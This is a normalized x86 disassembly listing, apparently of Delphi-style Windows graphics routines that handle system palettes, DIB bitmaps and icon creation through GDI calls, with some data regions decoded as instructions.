lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028b8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e05d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e064
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e078
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e0fe
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e110
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028b8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41df08
mov eax esp
call sub_41e078
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e1b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41df08
mov [ esp ] eax
sub_41e208
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41dbb0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41db90
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e3b4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41da20
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e2da
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41da30
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2e1
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41d924
sub_41e2e1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41dbb0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41da20
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e394
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41da30
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e39b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e3d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e460
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ac8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41e757
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41e549
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41d924
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e550
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e550
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e3c4
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407ac8
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41e737
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e208
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407ac8
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41e714
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e71b
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026dc
retn
call sub_41d978
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e3c4
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e3d0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41e780
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41d900
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c88
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41dbb0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41e864
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41e780
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41e8d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41e780
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e96d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e974
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_41e9a4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c88
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c88
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_41e998
xor edx edx
push ebp
push sub_41eb92
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41e864
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_41e864
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41eb6b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407ac8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407ac8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407ac8
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ac8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_41e8d0
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_41e8d0
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb72
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4026dc
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4026dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41eb72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eb99
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_41eba0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ebf0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_41ec48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_41ebf0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ec91
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4031b4
mov edi eax
mov eax esi
call sub_4031b4
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41edcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41edae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407bf4
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41edb5
mov al 0x1
sub_41ede4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415ad4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ee2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee33
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_41ee38
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41ee6c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415ad4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eeb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eebe
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
sub_41eee8
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
fdivr [ ebx ]
inc ecx
add [ eax + 0x1c004138 ] ah
cmp [ ecx ] eax
adc [ esi + eax * 2 + 0x69 ] dl
insb
inc esi
outsd
jb r-xdata
popad
je r-xdata
fiadd [ esi ]
popad
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
pop esp
out dx eax
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x41 ] ch
add [ eax ] dl
add [ eax ] al
add [ eax + 0x16 ] ah
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
mov ah 0xf0
inc ecx
add al dh
cmp [ ecx ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
xchg esp eax
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f100
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f064
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fe0
retn
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
call sub_405aec
mov ecx [ ebp - 0x8 ]
mov ebx edx
mov esi eax
